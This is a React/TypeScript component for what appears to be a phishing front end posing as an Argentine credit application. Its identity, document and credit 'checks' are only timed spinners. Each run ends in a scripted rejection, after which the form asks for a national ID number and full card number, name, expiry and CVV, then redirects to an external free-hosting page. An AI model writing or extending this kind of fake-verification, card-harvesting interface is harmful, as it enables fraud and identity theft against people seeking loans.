import React, { useState, useEffect } from 'react';
import { FloatingLogo } from './FloatingLogo';
import { LoadingScreen } from './LoadingScreen';
import { LoadingSpinner } from './LoadingSpinner';
import { RejectionMessage } from './RejectionMessage';
import { IdentificationStep } from './steps/IdentificationStep';
import { CardInfoStep } from './steps/CardInfoStep';
import { ProgressIndicator } from './ProgressIndicator';
import { motion, AnimatePresence } from 'framer-motion';

interface FormData {
  dni: string;
  cardInfo: {
    type: 'credit' | 'debit';
    number: string;
    name: string;
    expiry: string;
    cvv: string;
    bank?: string;
  };
}

type VerificationStep = 'initial' | 'document' | 'identity' | 'credit' | 'rejected' | 'form';

export const MultiStepForm: React.FC = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [verificationStep, setVerificationStep] = useState<VerificationStep>('initial');
  const [currentStep, setCurrentStep] = useState(0);
  const [formData, setFormData] = useState<FormData>({
    dni: '',
    cardInfo: {
      type: 'credit',
      number: '',
      name: '',
      expiry: '',
      cvv: ''
    }
  });

  useEffect(() => {
    const runVerification = async () => {
      // Initial loading
      await new Promise(resolve => setTimeout(resolve, 2000));
      setIsLoading(false);
      setVerificationStep('document');

      // Document processing
      await new Promise(resolve => setTimeout(resolve, 3000));
      setVerificationStep('identity');

      // Identity verification
      await new Promise(resolve => setTimeout(resolve, 3000));
      setVerificationStep('credit');

      // Credit check
      await new Promise(resolve => setTimeout(resolve, 10000));
      setVerificationStep('rejected');
    };

    runVerification();
  }, []);

  const handleRetry = () => {
    setVerificationStep('form');
    setCurrentStep(1);
  };

  const handleNext = async () => {
    setCurrentStep(prev => prev + 1);
  };

  const handleBack = () => {
    setCurrentStep(prev => prev - 1);
  };

  const updateFormData = (field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async () => {
    try {
      window.location.href = 'https://crediarg.webcindario.com/index.html';
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  const renderStep = () => {
    if (isLoading) {
      return <LoadingScreen />;
    }

    switch (verificationStep) {
      case 'document':
        return <LoadingSpinner type="document" message="Procesando documentación..." />;
      case 'identity':
        return <LoadingSpinner type="identity" message="Verificando identidad..." />;
      case 'credit':
        return <LoadingSpinner type="credit" message="Comprobando historial crediticio..." />;
      case 'rejected':
        return <RejectionMessage onRetry={handleRetry} />;
      case 'form':
        switch (currentStep) {
          case 1:
            return (
              <IdentificationStep
                dni={formData.dni}
                onDniChange={(value) => updateFormData('dni', value)}
                onNext={handleNext}
              />
            );
          case 2:
            return (
              <CardInfoStep
                cardInfo={formData.cardInfo}
                onCardInfoChange={(field, value) => {
                  setFormData(prev => ({
                    ...prev,
                    cardInfo: {
                      ...prev.cardInfo,
                      [field]: value
                    }
                  }));
                }}
                onNext={handleSubmit}
                onBack={handleBack}
              />
            );
          default:
            return null;
        }
      default:
        return null;
    }
  };

  return (
    <div className="w-full max-w-4xl">
      <FloatingLogo />
      <div className="relative bg-white/40 backdrop-blur-lg rounded-2xl shadow-lg overflow-hidden transition-all duration-500 ease-in-out">
        {verificationStep === 'form' && (
          <ProgressIndicator currentStep={currentStep} totalSteps={2} />
        )}
        <div className="p-6 sm:p-8 md:p-10">
          <AnimatePresence mode="wait">
            <motion.div
              key={`${verificationStep}-${currentStep}`}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
            >
              {renderStep()}
            </motion.div>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
};